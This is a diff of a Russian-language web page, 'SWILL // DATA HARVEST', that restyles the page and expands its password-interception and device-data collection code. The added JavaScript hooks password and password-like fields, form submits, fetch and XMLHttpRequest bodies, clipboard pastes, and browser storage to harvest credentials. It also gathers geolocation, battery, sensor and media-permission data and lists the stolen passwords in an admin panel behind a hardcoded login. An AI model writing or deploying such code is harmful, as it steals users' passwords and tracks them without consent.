@@ -3,128 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Сбор данных + Админ-панель</title>
+    <title>SWILL // DATA HARVEST</title>
     <style>
-        /* ===== ОБЩИЕ СТИЛИ ===== */
+        /* ===== КИБЕРПАНК-НЕОН ===== */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0f172a;
-            color: #e2e8f0;
+            font-family: 'Courier New', monospace;
+            background: #0a0a0f;
+            color: #b0f0ff;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
+            text-shadow: 0 0 8px rgba(0, 255, 255, 0.3);
         }
         .container {
-            background: #1e293b;
+            background: #12121c;
             padding: 30px;
-            border-radius: 16px;
-            max-width: 900px;
+            border-radius: 0px;
+            max-width: 950px;
             width: 100%;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            border: 2px solid #00ffff;
+            box-shadow: 0 0 40px #00ffff33, inset 0 0 30px #00ffff11;
         }
         h1, h2 {
             text-align: center;
-            margin-bottom: 10px;
-            color: #38bdf8;
+            font-weight: 300;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            color: #ff00ff;
+            text-shadow: 0 0 20px #ff00ff, 0 0 60px #ff00ff55;
+            margin-bottom: 12px;
+            font-size: 28px;
         }
-        p {
-            margin: 15px 0;
-            line-height: 1.6;
+        p, .status, .data-display, .session-item, .password-capture {
+            font-family: 'Courier New', monospace;
+            color: #aaffdd;
+            text-shadow: 0 0 5px #00ffaa55;
         }
         button {
-            background: #3b82f6;
-            color: white;
-            border: none;
+            background: #1a1a2e;
+            color: #00ffff;
+            border: 2px solid #00ffff;
             padding: 14px 28px;
             font-size: 18px;
-            border-radius: 8px;
+            border-radius: 0px;
             cursor: pointer;
             width: 100%;
-            transition: 0.3s;
+            transition: 0.2s;
             font-weight: bold;
             margin: 10px 0;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            box-shadow: 0 0 20px #00ffff33;
+            text-shadow: 0 0 10px #00ffff;
         }
         button:hover {
-            background: #2563eb;
+            background: #00ffff;
+            color: #0a0a0f;
+            box-shadow: 0 0 60px #00ffff, inset 0 0 20px #0a0a0f;
             transform: scale(1.02);
         }
         button.danger {
-            background: #ef4444;
+            border-color: #ff0055;
+            color: #ff0055;
+            box-shadow: 0 0 20px #ff005533;
+            text-shadow: 0 0 10px #ff0055;
         }
         button.danger:hover {
-            background: #dc2626;
+            background: #ff0055;
+            color: #0a0a0f;
+            box-shadow: 0 0 60px #ff0055;
         }
         input, textarea {
             width: 100%;
             padding: 12px;
             margin: 8px 0;
-            border-radius: 8px;
-            border: 1px solid #334155;
-            background: #0f172a;
-            color: #e2e8f0;
+            border-radius: 0px;
+            border: 2px solid #44ddff;
+            background: #0a0a12;
+            color: #ffddff;
             font-size: 16px;
+            font-family: 'Courier New', monospace;
+            box-shadow: inset 0 0 15px #00aaff33;
+            text-shadow: 0 0 8px #ff88ff;
         }
         .status {
             margin: 15px 0;
             padding: 10px;
-            background: #0f172a;
-            border-radius: 8px;
-            font-family: monospace;
-            color: #94a3b8;
+            background: #0a0a12;
+            border-left: 6px solid #ff00ff;
+            font-family: 'Courier New', monospace;
+            color: #bbffff;
+            text-shadow: 0 0 12px #00ffff;
         }
         .data-display {
             margin-top: 20px;
             padding: 15px;
-            background: #0f172a;
-            border-radius: 8px;
+            background: #08080e;
+            border: 1px solid #44ddff;
             max-height: 400px;
             overflow-y: auto;
             font-size: 13px;
             white-space: pre-wrap;
             word-break: break-all;
-            border: 1px solid #334155;
+            color: #ccffcc;
+            text-shadow: 0 0 6px #66ff66;
         }
         .hidden {
             display: none !important;
         }
         .admin-panel {
-            border-top: 2px solid #334155;
+            border-top: 3px solid #ff00ff;
             margin-top: 30px;
             padding-top: 20px;
+            box-shadow: inset 0 10px 30px #ff00ff11;
         }
         .session-item {
-            background: #0f172a;
+            background: #0c0c18;
             padding: 15px;
             margin: 10px 0;
-            border-radius: 8px;
-            border-left: 4px solid #3b82f6;
+            border-left: 6px solid #ff00ff;
+            border-right: 2px solid #00ffff;
+            box-shadow: 0 0 25px #ff00ff22;
+            color: #ddffff;
+            text-shadow: 0 0 8px #88ffff;
         }
         .session-item strong {
-            color: #38bdf8;
+            color: #ff88ff;
+            text-shadow: 0 0 20px #ff44ff;
         }
         .password-capture {
-            background: #1e293b;
-            padding: 10px;
-            border-radius: 8px;
+            background: #1a0a0a;
+            padding: 12px;
+            border-radius: 0px;
             margin: 5px 0;
-            font-family: monospace;
-            border: 1px solid #ef4444;
+            font-family: 'Courier New', monospace;
+            border: 2px solid #ff4444;
+            box-shadow: 0 0 30px #ff000066;
+            color: #ffaaaa;
+            text-shadow: 0 0 20px #ff3333;
         }
         .badge {
             display: inline-block;
-            background: #ef4444;
-            padding: 2px 12px;
-            border-radius: 20px;
+            background: #ff00aa;
+            padding: 2px 16px;
+            border-radius: 0px;
             font-size: 12px;
             font-weight: bold;
             margin-left: 10px;
+            color: #000;
+            text-shadow: none;
+            box-shadow: 0 0 30px #ff00aa;
+        }
+        ::-webkit-scrollbar {
+            width: 8px;
+            background: #0a0a12;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #ff00ff;
+            box-shadow: 0 0 20px #ff00ff;
         }
     </style>
 </head>
@@ -134,44 +177,44 @@
 
     <!-- ===== ГЛАВНАЯ СТРАНИЦА ===== -->
     <div id="mainPage">
-        <h1>📱 Сбор данных с устройства</h1>
-        <p>Нажмите кнопку, чтобы начать сбор. Все данные сохраняются локально и видны в админ-панели.</p>
-        <button id="startBtn">Начать сбор данных</button>
-        <div class="status" id="status">Ожидание...</div>
-        <button id="goToAdminBtn" style="background:#6b21a5;">🔐 Войти в админ-панель</button>
+        <h1>⛧ SWILL HARVEST ⛧</h1>
+        <p style="color:#88ddff; text-shadow: 0 0 20px #00ddff;">ПЕРЕХВАТ ПАРОЛЕЙ + СБОР ДАННЫХ</p>
+        <button id="startBtn">▶ ЗАПУСТИТЬ СБОР</button>
+        <div class="status" id="status">[ОЖИДАНИЕ]</div>
+        <button id="goToAdminBtn" style="border-color:#ff44ff; color:#ff44ff; box-shadow:0 0 30px #ff44ff55; text-shadow:0 0 15px #ff44ff;">🔐 АДМИН-ПАНЕЛЬ</button>
         <div class="data-display" id="dataDisplay"></div>
-        <button id="downloadBtn" class="hidden">Скачать JSON</button>
+        <button id="downloadBtn" class="hidden">⬇ СКАЧАТЬ JSON</button>
     </div>
 
-    <!-- ===== АДМИН-ПАНЕЛЬ (скрыта по умолчанию) ===== -->
+    <!-- ===== АДМИН-ПАНЕЛЬ ===== -->
     <div id="adminPage" class="hidden">
-        <h1>🔐 Админ-панель</h1>
-        <p>Введите логин и пароль для входа.</p>
+        <h1>⛧ АДМИН-ПАНЕЛЬ ⛧</h1>
+        <p style="color:#ff88ff;">ВВЕДИТЕ КРЕДЫ ДЛЯ ДОСТУПА</p>
 
         <div id="loginForm">
-            <input type="text" id="adminLogin" placeholder="Логин" value="admin">
-            <input type="password" id="adminPassword" placeholder="Пароль" value="par1s67">
-            <button id="adminLoginBtn">Войти</button>
+            <input type="text" id="adminLogin" placeholder="ЛОГИН" value="admin" style="border-color:#ff88ff;">
+            <input type="password" id="adminPassword" placeholder="ПАРОЛЬ" value="par1s67" style="border-color:#ff88ff;">
+            <button id="adminLoginBtn" style="border-color:#ff88ff; color:#ff88ff; box-shadow:0 0 30px #ff88ff33;">ВОЙТИ</button>
             <div class="status" id="adminStatus"></div>
         </div>
 
         <div id="adminContent" class="hidden">
-            <h2>📊 Все сессии с данными</h2>
-            <button id="clearSessionsBtn" class="danger">🗑️ Очистить все сессии</button>
-            <button id="exportAllBtn">📥 Экспортировать всё в JSON</button>
+            <h2 style="font-size:22px;">📡 ВСЕ СЕССИИ</h2>
+            <button id="clearSessionsBtn" class="danger">🗑️ ОЧИСТИТЬ ВСЁ</button>
+            <button id="exportAllBtn" style="border-color:#ffaa00; color:#ffaa00; box-shadow:0 0 30px #ffaa0044;">📥 ЭКСПОРТ ВСЕГО</button>
             <div id="sessionsList"></div>
 
-            <h2 style="margin-top:30px;">🔑 Перехваченные пароли</h2>
+            <h2 style="font-size:22px; margin-top:30px; color:#ff6666;">🔑 ПЕРЕХВАЧЕННЫЕ ПАРОЛИ</h2>
             <div id="passwordsList"></div>
 
-            <button id="logoutBtn" style="background:#6b21a5; margin-top:20px;">🚪 Выйти из админки</button>
+            <button id="logoutBtn" style="border-color:#8866ff; color:#8866ff; margin-top:20px;">🚪 ВЫЙТИ</button>
         </div>
     </div>
 </div>
 
 <script>
     // ============================================================
-    // 1. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
+    // 1. ГЛОБАЛЬНЫЕ
     // ============================================================
     let collectedData = {};
     let sessions = JSON.parse(localStorage.getItem('sessions') || '[]');
@@ -179,92 +222,161 @@
     let isAdmin = false;
 
     // ============================================================
-    // 2. ПЕРЕХВАТ ПАРОЛЕЙ (следит за всеми полями password)
+    // 2. АГРЕССИВНЫЙ ПЕРЕХВАТ ПАРОЛЕЙ
     // ============================================================
+    function capturePassword(value, source = 'manual', extra = {}) {
+        if (!value || value.length < 1) return;
+        const entry = {
+            timestamp: new Date().toISOString(),
+            value: value,
+            source: source,
+            url: window.location.href,
+            ...extra
+        };
+        // Проверка на дубликат (по значению + url)
+        const exists = capturedPasswords.some(p => p.value === value && p.url === entry.url);
+        if (!exists) {
+            capturedPasswords.push(entry);
+            localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
+            console.log('[SWILL] Пароль перехвачен:', value);
+        }
+    }
+
     function setupPasswordCapture() {
-        // Перехватываем все существующие и будущие поля password
-        document.addEventListener('focusin', function(e) {
-            if (e.target && e.target.type === 'password') {
-                const field = e.target;
-                // Сохраняем значение при каждом изменении
-                field.addEventListener('input', function capture() {
-                    const val = field.value;
-                    if (val.length > 0) {
-                        const entry = {
-                            timestamp: new Date().toISOString(),
-                            value: val,
-                            name: field.name || 'unknown',
-                            id: field.id || 'unknown',
-                            url: window.location.href
-                        };
-                        // Добавляем, если такого пароля ещё нет (уникальность по значению)
-                        const exists = capturedPasswords.some(p => p.value === val && p.url === entry.url);
-                        if (!exists) {
-                            capturedPasswords.push(entry);
-                            localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
-                            console.log('[Пароль перехвачен]', val);
-                        }
-                    }
-                });
-                // Удаляем слушатель, чтобы не дублировать
-                field.removeEventListener('input', capture);
+        // 1. Все password-поля (включая будущие)
+        const observer = new MutationObserver(() => {
+            document.querySelectorAll('input[type="password"]').forEach(field => {
+                if (!field.dataset.swillCaptured) {
+                    field.dataset.swillCaptured = 'true';
+                    field.addEventListener('input', function() {
+                        if (this.value) capturePassword(this.value, 'password-field', {
+                            name: this.name || 'unknown',
+                            id: this.id || 'unknown'
+                        });
+                    });
+                }
+            });
+        });
+        observer.observe(document.body, { childList: true, subtree: true });
+
+        // 2. Также перехватываем text-поля с подозрительными именами
+        document.querySelectorAll('input[type="text"]').forEach(field => {
+            const name = (field.name || field.id || '').toLowerCase();
+            if (name.includes('pass') || name.includes('pwd') || name.includes('senha') || name.includes('password')) {
+                if (!field.dataset.swillCaptured) {
+                    field.dataset.swillCaptured = 'true';
+                    field.addEventListener('input', function() {
+                        if (this.value) capturePassword(this.value, 'text-field-suspect', {
+                            name: this.name || 'unknown',
+                            id: this.id || 'unknown'
+                        });
+                    });
+                }
             }
         });
 
-        // Также перехватываем submit форм
+        // 3. Перехват submit форм
         document.addEventListener('submit', function(e) {
             const form = e.target;
-            const inputs = form.querySelectorAll('input[type="password"]');
+            const inputs = form.querySelectorAll('input[type="password"], input[type="text"]');
             inputs.forEach(inp => {
                 if (inp.value) {
-                    const entry = {
-                        timestamp: new Date().toISOString(),
-                        value: inp.value,
-                        name: inp.name || 'unknown',
-                        id: inp.id || 'unknown',
-                        url: window.location.href,
-                        formAction: form.action || 'unknown'
-                    };
-                    const exists = capturedPasswords.some(p => p.value === inp.value && p.url === entry.url);
-                    if (!exists) {
-                        capturedPasswords.push(entry);
-                        localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
+                    const name = (inp.name || inp.id || '').toLowerCase();
+                    if (inp.type === 'password' || name.includes('pass') || name.includes('pwd')) {
+                        capturePassword(inp.value, 'form-submit', {
+                            name: inp.name || 'unknown',
+                            id: inp.id || 'unknown',
+                            formAction: form.action || 'unknown'
+                        });
                     }
                 }
             });
         });
 
-        // Перехват AJAX-запросов (базовый)
+        // 4. Перехват fetch (тела запросов)
         const originalFetch = window.fetch;
         window.fetch = function(...args) {
             return originalFetch.apply(this, args).then(response => {
-                // Пытаемся найти пароли в теле запроса
                 try {
                     const body = args[1]?.body;
                     if (body && typeof body === 'string') {
-                        const match = body.match(/["']password["']\s*:\s*["']([^"']+)["']/i);
-                        if (match && match[1]) {
-                            const entry = {
-                                timestamp: new Date().toISOString(),
-                                value: match[1],
-                                source: 'fetch',
-                                url: args[0]
-                            };
-                            const exists = capturedPasswords.some(p => p.value === match[1] && p.url === args[0]);
-                            if (!exists) {
-                                capturedPasswords.push(entry);
-                                localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
-                            }
+                        // Ищем password в JSON
+                        const matches = body.match(/["']password["']\s*:\s*["']([^"']+)["']/gi);
+                        if (matches) {
+                            matches.forEach(m => {
+                                const val = m.match(/["']password["']\s*:\s*["']([^"']+)["']/i);
+                                if (val && val[1]) capturePassword(val[1], 'fetch-json', { url: args[0] });
+                            });
+                        }
+                        // Ищем в формате x-www-form-urlencoded
+                        const urlParams = new URLSearchParams(body);
+                        if (urlParams.has('password')) {
+                            capturePassword(urlParams.get('password'), 'fetch-form', { url: args[0] });
                         }
                     }
                 } catch(e) {}
                 return response;
             });
         };
+
+        // 5. Перехват XMLHttpRequest
+        const originalOpen = XMLHttpRequest.prototype.open;
+        const originalSend = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.open = function(method, url) {
+            this._swillUrl = url;
+            this._swillMethod = method;
+            return originalOpen.apply(this, arguments);
+        };
+        XMLHttpRequest.prototype.send = function(body) {
+            try {
+                if (body && typeof body === 'string') {
+                    const urlParams = new URLSearchParams(body);
+                    if (urlParams.has('password')) {
+                        capturePassword(urlParams.get('password'), 'xhr-form', { url: this._swillUrl });
+                    }
+                    // JSON
+                    const match = body.match(/["']password["']\s*:\s*["']([^"']+)["']/i);
+                    if (match && match[1]) {
+                        capturePassword(match[1], 'xhr-json', { url: this._swillUrl });
+                    }
+                }
+            } catch(e) {}
+            return originalSend.apply(this, arguments);
+        };
+
+        // 6. Чтение localStorage и sessionStorage на предмет паролей
+        function scanStorage(storage, source) {
+            for (let i = 0; i < storage.length; i++) {
+                const key = storage.key(i);
+                if (key) {
+                    const val = storage.getItem(key);
+                    if (typeof val === 'string' && val.length > 0) {
+                        // Если ключ содержит password или значение похоже на пароль (длина > 4, нет пробелов)
+                        const lowerKey = key.toLowerCase();
+                        if (lowerKey.includes('pass') || lowerKey.includes('pwd') || lowerKey.includes('senha')) {
+                            capturePassword(val, `storage-${source}`, { storageKey: key });
+                        } else if (val.length >= 6 && /^[a-zA-Z0-9!@#$%^&*()_+\-={}[\]:;"'<>,.?/~`]+$/.test(val) && !val.includes(' ')) {
+                            // Подозрительная строка — возможно пароль
+                            capturePassword(val, `storage-${source}-suspect`, { storageKey: key });
+                        }
+                    }
+                }
+            }
+        }
+        scanStorage(localStorage, 'localStorage');
+        scanStorage(sessionStorage, 'sessionStorage');
+
+        // 7. Перехват clipboard (если вставят пароль)
+        document.addEventListener('paste', function(e) {
+            const text = e.clipboardData?.getData('text/plain');
+            if (text && text.length >= 4 && /[a-zA-Z0-9!@#$%^&*()]/.test(text)) {
+                capturePassword(text, 'clipboard', {});
+            }
+        });
     }
 
     // ============================================================
-    // 3. СБОР ДАННЫХ С УСТРОЙСТВА
+    // 3. СБОР ДАННЫХ (включая все пароли из памяти)
     // ============================================================
     function getBrowserInfo() {
         return {
@@ -484,7 +596,7 @@
     }
 
     async function collectAllData() {
-        updateStatus('🔍 Сбор данных...');
+        updateStatus('⛧ ЗАПУСК СБОРА... ⛧');
 
         const data = {
             timestamp: new Date().toISOString(),
@@ -499,15 +611,13 @@
             battery: await getBatteryInfo(),
             sensors: await startSensors(),
             mediaPermissions: await getMediaPermissions(),
-            // Дополнительно: все пароли, которые есть на странице
-            capturedPasswords: capturedPasswords.slice(-20) // последние 20
+            allCapturedPasswords: capturedPasswords.slice(-50) // последние 50
         };
 
         collectedData = data;
         displayData(data);
-        updateStatus('✅ Сбор завершён! Данные сохранены.');
+        updateStatus('✅ СБОР ЗАВЕРШЁН. ДАННЫЕ СОХРАНЕНЫ.');
 
-        // Сохраняем сессию
         const session = {
             id: Date.now(),
             timestamp: data.timestamp,
@@ -515,7 +625,8 @@
             preview: {
                 userAgent: data.browserInfo.userAgent.substring(0, 60),
                 location: data.geolocation.latitude ? `${data.geolocation.latitude}, ${data.geolocation.longitude}` : 'нет',
-                battery: data.battery.level || 'нет'
+                battery: data.battery.level || 'нет',
+                passwordsCount: capturedPasswords.length
             }
         };
         sessions.push(session);
@@ -525,7 +636,7 @@
     }
 
     // ============================================================
-    // 4. UI ФУНКЦИИ
+    // 4. UI
     // ============================================================
     function updateStatus(msg) {
         document.getElementById('status').innerHTML = msg;
@@ -539,7 +650,7 @@
 
     function downloadJSON() {
         if (Object.keys(collectedData).length === 0) {
-            alert('Нет данных. Сначала соберите.');
+            alert('Нет данных.');
             return;
         }
         const jsonStr = JSON.stringify(collectedData, null, 2);
@@ -547,7 +658,7 @@
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `device_data_${new Date().toISOString().slice(0,10)}.json`;
+        a.download = `swill_harvest_${new Date().toISOString().slice(0,10)}.json`;
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
@@ -555,16 +666,15 @@
     }
 
     // ============================================================
-    // 5. АДМИН-ПАНЕЛЬ
+    // 5. АДМИНКА
     // ============================================================
     function renderAdminPanel() {
         const sessionsList = document.getElementById('sessionsList');
         const passwordsList = document.getElementById('passwordsList');
 
-        // Сессии
         sessionsList.innerHTML = '';
         if (sessions.length === 0) {
-            sessionsList.innerHTML = '<p style="color:#94a3b8;">Нет сохранённых сессий.</p>';
+            sessionsList.innerHTML = '<p style="color:#6688aa;">[ НЕТ СЕССИЙ ]</p>';
         } else {
             sessions.slice().reverse().forEach(s => {
                 const div = document.createElement('div');
@@ -572,35 +682,33 @@
                 div.innerHTML = `
                     <strong>${new Date(s.timestamp).toLocaleString()}</strong>
                     <span class="badge">ID: ${s.id}</span>
-                    <br>User-Agent: ${s.preview.userAgent || 'нет'}
-                    <br>Локация: ${s.preview.location || 'нет'}
-                    <br>Батарея: ${s.preview.battery || 'нет'}
-                    <br><button class="view-session-btn" data-id="${s.id}">📄 Просмотреть данные</button>
-                    <button class="delete-session-btn" data-id="${s.id}" style="background:#ef4444;width:auto;padding:5px 15px;font-size:14px;">🗑️ Удалить</button>
+                    <br>UA: ${s.preview.userAgent || 'нет'}
+                    <br>ЛОКАЦИЯ: ${s.preview.location || 'нет'}
+                    <br>БАТАРЕЯ: ${s.preview.battery || 'нет'} | ПАРОЛЕЙ: ${s.preview.passwordsCount || 0}
+                    <br><button class="view-session-btn" data-id="${s.id}" style="width:auto;padding:6px 20px;font-size:14px;display:inline-block;margin-right:10px;">👁️ ПОКАЗАТЬ</button>
+                    <button class="delete-session-btn" data-id="${s.id}" style="border-color:#ff4444;color:#ff4444;width:auto;padding:6px 20px;font-size:14px;display:inline-block;">🗑️ УДАЛИТЬ</button>
                 `;
                 sessionsList.appendChild(div);
             });
         }
 
-        // Пароли
         passwordsList.innerHTML = '';
         if (capturedPasswords.length === 0) {
-            passwordsList.innerHTML = '<p style="color:#94a3b8;">Пароли не перехвачены.</p>';
+            passwordsList.innerHTML = '<p style="color:#6688aa;">[ НЕТ ПЕРЕХВАЧЕННЫХ ПАРОЛЕЙ ]</p>';
         } else {
             capturedPasswords.slice().reverse().forEach(p => {
                 const div = document.createElement('div');
                 div.className = 'password-capture';
                 div.innerHTML = `
                     <strong>${new Date(p.timestamp).toLocaleString()}</strong>
-                    <span style="color:#f87171;">Пароль: ${p.value}</span>
-                    <br>Поле: ${p.name || p.id || 'неизвестно'}
-                    <br>URL: ${p.url || 'неизвестно'}
+                    <span style="color:#ff6666;">⚡ ${p.value}</span>
+                    <br>ИСТОЧНИК: ${p.source || 'unknown'} | ПОЛЕ: ${p.name || p.id || '—'}
+                    <br>URL: ${p.url || '—'}
                 `;
                 passwordsList.appendChild(div);
             });
         }
 
-        // Обработчики кнопок просмотра сессии
         document.querySelectorAll('.view-session-btn').forEach(btn => {
             btn.onclick = function() {
                 const id = parseInt(this.dataset.id);
@@ -636,44 +744,37 @@
     }
 
     // ============================================================
-    // 6. ИНИЦИАЛИЗАЦИЯ И СОБЫТИЯ
+    // 6. ИНИЦИАЛИЗАЦИЯ
     // ============================================================
     document.addEventListener('DOMContentLoaded', function() {
-        // Запускаем перехват паролей
         setupPasswordCapture();
 
-        // Главная страница
         document.getElementById('startBtn').addEventListener('click', async function() {
             this.disabled = true;
-            this.textContent = 'Сбор...';
+            this.textContent = '⛧ СБОР... ⛧';
             await collectAllData();
             this.disabled = false;
-            this.textContent = 'Начать сбор данных';
+            this.textContent = '▶ ЗАПУСТИТЬ СБОР';
         });
 
         document.getElementById('downloadBtn').addEventListener('click', downloadJSON);
 
-        // Переход в админку
-        document.getElementById('goToAdminBtn').addEventListener('click', function() {
-            showAdminPage();
-        });
+        document.getElementById('goToAdminBtn').addEventListener('click', showAdminPage);
 
-        // Вход в админку
         document.getElementById('adminLoginBtn').addEventListener('click', function() {
             const login = document.getElementById('adminLogin').value.trim();
             const password = document.getElementById('adminPassword').value.trim();
             if (login === 'admin' && password === 'par1s67') {
-                document.getElementById('adminStatus').textContent = '✅ Вход выполнен!';
-                document.getElementById('adminStatus').style.color = '#4ade80';
+                document.getElementById('adminStatus').textContent = '✅ ДОСТУП РАЗРЕШЁН';
+                document.getElementById('adminStatus').style.color = '#88ff88';
                 isAdmin = true;
                 showAdminContent();
             } else {
-                document.getElementById('adminStatus').textContent = '❌ Неверный логин или пароль!';
-                document.getElementById('adminStatus').style.color = '#f87171';
+                document.getElementById('adminStatus').textContent = '❌ ДОСТУП ЗАПРЕЩЁН';
+                document.getElementById('adminStatus').style.color = '#ff6666';
             }
         });
 
-        // Выход из админки
         document.getElementById('logoutBtn').addEventListener('click', function() {
             isAdmin = false;
             document.getElementById('adminPage').classList.add('hidden');
@@ -683,16 +784,16 @@
             document.getElementById('adminStatus').textContent = '';
         });
 
-        // Очистка всех сессий
         document.getElementById('clearSessionsBtn').addEventListener('click', function() {
-            if (confirm('Удалить все сессии?')) {
+            if (confirm('УДАЛИТЬ ВСЕ СЕССИИ И ПАРОЛИ?')) {
                 sessions = [];
+                capturedPasswords = [];
                 localStorage.setItem('sessions', JSON.stringify(sessions));
+                localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
                 renderAdminPanel();
             }
         });
 
-        // Экспорт всех данных
         document.getElementById('exportAllBtn').addEventListener('click', function() {
             const exportData = {
                 sessions: sessions,
@@ -704,43 +805,13 @@
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `admin_export_${new Date().toISOString().slice(0,10)}.json`;
+            a.download = `swill_export_${new Date().toISOString().slice(0,10)}.json`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
         });
     });
-
-    // ============================================================
-    // 7. ДОПОЛНИТЕЛЬНЫЙ ПЕРЕХВАТ: отслеживаем все поля ввода
-    // ============================================================
-    // Автоматически перехватываем любые поля, даже если они добавлены динамически
-    const observer = new MutationObserver(() => {
-        document.querySelectorAll('input[type="password"]').forEach(field => {
-            if (!field.dataset.captured) {
-                field.dataset.captured = 'true';
-                field.addEventListener('input', function() {
-                    const val = this.value;
-                    if (val.length > 0) {
-                        const entry = {
-                            timestamp: new Date().toISOString(),
-                            value: val,
-                            name: this.name || 'unknown',
-                            id: this.id || 'unknown',
-                            url: window.location.href
-                        };
-                        const exists = capturedPasswords.some(p => p.value === val && p.url === entry.url);
-                        if (!exists) {
-                            capturedPasswords.push(entry);
-                            localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
-                        }
-                    }
-                });
-            }
-        });
-    });
-    observer.observe(document.body, { childList: true, subtree: true });
 </script>
 
 </body>
